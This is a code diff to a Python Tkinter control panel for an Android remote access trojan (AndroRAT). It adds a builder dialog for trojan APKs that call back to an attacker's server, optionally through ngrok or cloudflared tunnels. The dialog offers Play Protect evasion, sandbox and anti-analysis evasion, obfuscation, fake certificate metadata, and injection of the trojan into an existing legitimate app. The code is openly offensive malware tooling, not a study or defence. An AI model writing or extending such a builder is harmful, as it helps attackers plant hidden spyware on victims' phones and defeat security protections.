@@ -543,55 +543,303 @@ class AdvancedAndroRATGUI:
         self.client_count.set(str(len(sample_clients)))
         
     def open_apk_builder(self):
-        """Open APK builder dialog"""
+        """Open enhanced APK builder dialog with all features"""
         # Create APK builder window
         apk_window = tk.Toplevel(self.root)
-        apk_window.title("APK Builder")
-        apk_window.geometry("600x400")
+        apk_window.title("Advanced APK Builder")
+        apk_window.geometry("700x800")
         apk_window.transient(self.root)
         apk_window.grab_set()
         
+        # Make window scrollable
+        canvas = tk.Canvas(apk_window)
+        scrollbar = ttk.Scrollbar(apk_window, orient="vertical", command=canvas.yview)
+        scrollable_frame = ttk.Frame(canvas)
+        
+        scrollable_frame.bind(
+            "<Configure>",
+            lambda e: canvas.configure(scrollregion=canvas.bbox("all"))
+        )
+        
+        canvas.create_window((0, 0), window=scrollable_frame, anchor="nw")
+        canvas.configure(yscrollcommand=scrollbar.set)
+        
         # APK builder content
-        ttk.Label(apk_window, text="APK Builder", 
-                 font=('TkDefaultFont', 14, 'bold')).pack(pady=20)
+        title_frame = ttk.Frame(scrollable_frame)
+        title_frame.pack(fill=tk.X, padx=20, pady=10)
+        
+        ttk.Label(title_frame, text="🚀 Advanced APK Builder", 
+                 font=('TkDefaultFont', 16, 'bold')).pack()
+        ttk.Label(title_frame, text="Build APKs with advanced evasion and injection features", 
+                 font=('TkDefaultFont', 10)).pack()
         
         # Configuration frame
-        config_frame = ttk.LabelFrame(apk_window, text="Configuration", padding=20)
+        config_frame = ttk.LabelFrame(scrollable_frame, text="Basic Configuration", padding=15)
         config_frame.pack(fill=tk.X, padx=20, pady=10)
         
         # IP and Port
         ttk.Label(config_frame, text="Server IP:").grid(row=0, column=0, sticky='w', pady=5)
-        ip_entry = ttk.Entry(config_frame, width=20)
-        ip_entry.grid(row=0, column=1, padx=(10, 0), pady=5)
+        self.apk_ip_var = tk.StringVar()
+        ip_entry = ttk.Entry(config_frame, textvariable=self.apk_ip_var, width=25)
+        ip_entry.grid(row=0, column=1, padx=(10, 0), pady=5, sticky='w')
         
         ttk.Label(config_frame, text="Server Port:").grid(row=1, column=0, sticky='w', pady=5)
-        port_entry = ttk.Entry(config_frame, width=20)
-        port_entry.grid(row=1, column=1, padx=(10, 0), pady=5)
+        self.apk_port_var = tk.StringVar(value="8000")
+        port_entry = ttk.Entry(config_frame, textvariable=self.apk_port_var, width=25)
+        port_entry.grid(row=1, column=1, padx=(10, 0), pady=5, sticky='w')
         
         ttk.Label(config_frame, text="Output APK:").grid(row=2, column=0, sticky='w', pady=5)
-        output_entry = ttk.Entry(config_frame, width=20)
-        output_entry.grid(row=2, column=1, padx=(10, 0), pady=5)
+        self.apk_output_var = tk.StringVar(value="enhanced_rat.apk")
+        output_entry = ttk.Entry(config_frame, textvariable=self.apk_output_var, width=25)
+        output_entry.grid(row=2, column=1, padx=(10, 0), pady=5, sticky='w')
         
-        # Options
-        options_frame = ttk.LabelFrame(apk_window, text="Options", padding=20)
-        options_frame.pack(fill=tk.X, padx=20, pady=10)
+        ttk.Button(config_frame, text="Browse", 
+                  command=self.browse_apk_output).grid(row=2, column=2, padx=(5, 0), pady=5)
         
-        icon_var = tk.BooleanVar()
-        ttk.Checkbutton(options_frame, text="Hide app icon", 
-                       variable=icon_var).pack(anchor='w')
+        # Basic Options
+        basic_frame = ttk.LabelFrame(scrollable_frame, text="Basic Options", padding=15)
+        basic_frame.pack(fill=tk.X, padx=20, pady=10)
         
-        stealth_var = tk.BooleanVar()
-        ttk.Checkbutton(options_frame, text="Enable stealth mode", 
-                       variable=stealth_var).pack(anchor='w')
+        self.apk_icon_var = tk.BooleanVar()
+        ttk.Checkbutton(basic_frame, text="🎯 Visible app icon after installation", 
+                       variable=self.apk_icon_var).pack(anchor='w', pady=2)
         
-        # Build button
-        ttk.Button(apk_window, text="Build APK",
-                  command=lambda: self.build_apk(apk_window)).pack(pady=20)
+        self.apk_tunnel_var = tk.BooleanVar()
+        ttk.Checkbutton(basic_frame, text="🌐 Auto-configure tunnel (no manual IP needed)", 
+                       variable=self.apk_tunnel_var, command=self.on_apk_tunnel_toggle).pack(anchor='w', pady=2)
         
-    def build_apk(self, window):
-        """Build APK with current settings"""
-        messagebox.showinfo("APK Builder", "APK build started!\nCheck console for progress.")
+        # Tunnel service selection
+        tunnel_service_frame = ttk.Frame(basic_frame)
+        tunnel_service_frame.pack(fill=tk.X, pady=5)
+        
+        ttk.Label(tunnel_service_frame, text="Tunnel Service:").pack(side=tk.LEFT)
+        self.apk_tunnel_service_var = tk.StringVar(value="auto")
+        tunnel_combo = ttk.Combobox(tunnel_service_frame, textvariable=self.apk_tunnel_service_var,
+                                   values=["auto", "cloudflared", "serveo", "localtunnel", "ngrok"],
+                                   state="readonly", width=15)
+        tunnel_combo.pack(side=tk.LEFT, padx=(5, 0))
+        
+        # Advanced Evasion Options
+        evasion_frame = ttk.LabelFrame(scrollable_frame, text="🛡️ Advanced Evasion Options", padding=15)
+        evasion_frame.pack(fill=tk.X, padx=20, pady=10)
+        
+        # Create two columns for evasion options
+        evasion_cols = ttk.Frame(evasion_frame)
+        evasion_cols.pack(fill=tk.X)
+        
+        left_evasion = ttk.Frame(evasion_cols)
+        left_evasion.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
+        
+        right_evasion = ttk.Frame(evasion_cols)
+        right_evasion.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
+        
+        # Evasion variables
+        self.apk_stealth_var = tk.BooleanVar()
+        self.apk_anti_analysis_var = tk.BooleanVar()
+        self.apk_play_protect_var = tk.BooleanVar()
+        self.apk_obfuscation_var = tk.BooleanVar()
+        self.apk_fake_certs_var = tk.BooleanVar()
+        self.apk_random_package_var = tk.BooleanVar()
+        
+        # Left column evasion options
+        ttk.Checkbutton(left_evasion, text="🛡️ Maximum Stealth Mode", 
+                       variable=self.apk_stealth_var).pack(anchor='w', pady=2)
+        ttk.Checkbutton(left_evasion, text="🔍 Anti-Analysis & Sandbox Evasion", 
+                       variable=self.apk_anti_analysis_var).pack(anchor='w', pady=2)
+        ttk.Checkbutton(left_evasion, text="🛡️ Play Protect Evasion", 
+                       variable=self.apk_play_protect_var).pack(anchor='w', pady=2)
+        
+        # Right column evasion options
+        ttk.Checkbutton(right_evasion, text="🔐 Advanced String Obfuscation", 
+                       variable=self.apk_obfuscation_var).pack(anchor='w', pady=2)
+        ttk.Checkbutton(right_evasion, text="📜 Fake Certificate Metadata", 
+                       variable=self.apk_fake_certs_var).pack(anchor='w', pady=2)
+        ttk.Checkbutton(right_evasion, text="📦 Random Package Name", 
+                       variable=self.apk_random_package_var).pack(anchor='w', pady=2)
+        
+        # APK Injection Options
+        injection_frame = ttk.LabelFrame(scrollable_frame, text="💉 APK Injection Mode", padding=15)
+        injection_frame.pack(fill=tk.X, padx=20, pady=10)
+        
+        self.apk_inject_var = tk.BooleanVar()
+        ttk.Checkbutton(injection_frame, text="💉 Inject into existing APK (preserves original functionality)", 
+                       variable=self.apk_inject_var, command=self.on_apk_inject_toggle).pack(anchor='w', pady=5)
+        
+        # Target APK frame (initially hidden)
+        self.apk_target_frame = ttk.Frame(injection_frame)
+        
+        ttk.Label(self.apk_target_frame, text="Target APK:").pack(side=tk.LEFT)
+        self.apk_target_var = tk.StringVar()
+        target_entry = ttk.Entry(self.apk_target_frame, textvariable=self.apk_target_var, width=35)
+        target_entry.pack(side=tk.LEFT, padx=(5, 10))
+        
+        ttk.Button(self.apk_target_frame, text="Browse APK", 
+                  command=self.browse_target_apk).pack(side=tk.LEFT)
+        
+        # Build buttons
+        button_frame = ttk.Frame(scrollable_frame)
+        button_frame.pack(fill=tk.X, padx=20, pady=20)
+        
+        ttk.Button(button_frame, text="🚀 Build APK", 
+                  command=lambda: self.build_enhanced_apk(apk_window)).pack(side=tk.LEFT, padx=(0, 10))
+        
+        ttk.Button(button_frame, text="❌ Cancel", 
+                  command=apk_window.destroy).pack(side=tk.LEFT)
+        
+        # Pack scrollable components
+        canvas.pack(side="left", fill="both", expand=True)
+        scrollbar.pack(side="right", fill="y")
+        
+    def on_apk_tunnel_toggle(self):
+        """Handle APK builder tunnel toggle"""
+        if self.apk_tunnel_var.get():
+            self.apk_ip_var.set("(auto-configured by tunnel)")
+        else:
+            self.apk_ip_var.set("")
+    
+    def on_apk_inject_toggle(self):
+        """Handle APK injection toggle"""
+        if self.apk_inject_var.get():
+            self.apk_target_frame.pack(fill=tk.X, pady=5)
+        else:
+            self.apk_target_frame.pack_forget()
+            self.apk_target_var.set("")
+    
+    def browse_apk_output(self):
+        """Browse for APK output location"""
+        filename = filedialog.asksaveasfilename(
+            title="Save APK as...",
+            defaultextension=".apk",
+            filetypes=[("APK files", "*.apk"), ("All files", "*.*")]
+        )
+        if filename:
+            self.apk_output_var.set(os.path.basename(filename))
+    
+    def browse_target_apk(self):
+        """Browse for target APK to inject into"""
+        filename = filedialog.askopenfilename(
+            title="Select target APK...",
+            filetypes=[("APK files", "*.apk"), ("All files", "*.*")]
+        )
+        if filename:
+            self.apk_target_var.set(filename)
+    
+    def build_enhanced_apk(self, window):
+        """Build APK with enhanced features"""
+        # Import validation functions
+        from utils import is_valid_ip, is_valid_port, is_valid_filename, inject_rat_into_apk, build_with_evasion, build
+        
+        # Validate inputs
+        if not self.apk_tunnel_var.get() and not self.apk_ip_var.get():
+            messagebox.showerror("Error", "IP address required when not using tunneling")
+            return
+        
+        if not self.apk_tunnel_var.get() and not is_valid_ip(self.apk_ip_var.get()):
+            messagebox.showerror("Error", "Invalid IP address format")
+            return
+        
+        if not self.apk_port_var.get():
+            messagebox.showerror("Error", "Port is required")
+            return
+            
+        if not is_valid_port(self.apk_port_var.get()):
+            messagebox.showerror("Error", "Invalid port number")
+            return
+            
+        if not self.apk_output_var.get():
+            messagebox.showerror("Error", "Output filename is required")
+            return
+        
+        if not is_valid_filename(self.apk_output_var.get()):
+            # Auto-add .apk extension if missing
+            filename = self.apk_output_var.get()
+            if not filename.lower().endswith('.apk'):
+                filename += '.apk'
+                self.apk_output_var.set(filename)
+        
+        if self.apk_inject_var.get():
+            if not self.apk_target_var.get():
+                messagebox.showerror("Error", "Target APK required for injection mode")
+                return
+            if not os.path.exists(self.apk_target_var.get()):
+                messagebox.showerror("Error", "Target APK file does not exist")
+                return
+        
+        # Collect evasion options
+        evasion_options = {
+            'stealth': self.apk_stealth_var.get(),
+            'anti_analysis': self.apk_anti_analysis_var.get(),
+            'play_protect_evasion': self.apk_play_protect_var.get(),
+            'advanced_obfuscation': self.apk_obfuscation_var.get(),
+            'fake_certificates': self.apk_fake_certs_var.get(),
+            'random_package': self.apk_random_package_var.get()
+        }
+        
+        # Show build dialog
+        build_info = "APK Build Started!\n\n"
+        build_info += f"Output: {self.apk_output_var.get()}\n"
+        build_info += f"IP: {self.apk_ip_var.get()}\n"
+        build_info += f"Port: {self.apk_port_var.get()}\n"
+        
+        if any(evasion_options.values()):
+            build_info += f"\nEvasion Features:\n"
+            for option, enabled in evasion_options.items():
+                if enabled:
+                    build_info += f"✓ {option.replace('_', ' ').title()}\n"
+        
+        if self.apk_inject_var.get():
+            build_info += f"\nInjection Mode:\n✓ Target: {os.path.basename(self.apk_target_var.get())}\n"
+        
+        build_info += "\nCheck console for detailed progress..."
+        
+        # Start build in background thread
+        build_thread = threading.Thread(target=self._build_apk_thread, 
+                                       args=(evasion_options,))
+        build_thread.daemon = True
+        build_thread.start()
+        
+        messagebox.showinfo("Enhanced APK Builder", build_info)
         window.destroy()
+    
+    def _build_apk_thread(self, evasion_options):
+        """Background thread for APK building"""
+        try:
+            from utils import inject_rat_into_apk, build_with_evasion, build
+            
+            ip = self.apk_ip_var.get()
+            port = self.apk_port_var.get()
+            output = self.apk_output_var.get()
+            icon = self.apk_icon_var.get()
+            
+            # Handle tunneling (simplified for advanced GUI)
+            if self.apk_tunnel_var.get():
+                ip = "127.0.0.1"  # Default for tunnel mode
+            
+            # Check if using injection mode
+            if self.apk_inject_var.get():
+                success = inject_rat_into_apk(
+                    self.apk_target_var.get(),
+                    ip,
+                    port,
+                    output,
+                    evasion_options
+                )
+                
+                if success:
+                    self.message_queue.put(("success", f"APK injection completed: {output}"))
+                else:
+                    self.message_queue.put(("error", "APK injection failed"))
+            else:
+                # Check if using evasion
+                if any(evasion_options.values()):
+                    build_with_evasion(ip, port, output, False, None, icon, evasion_options)
+                else:
+                    build(ip, port, output, False, None, icon)
+                
+                self.message_queue.put(("success", f"APK built successfully: {output}"))
+                
+        except Exception as e:
+            self.message_queue.put(("error", f"Build failed: {str(e)}"))
         
     def start_background_tasks(self):
         """Start background tasks for GUI updates"""
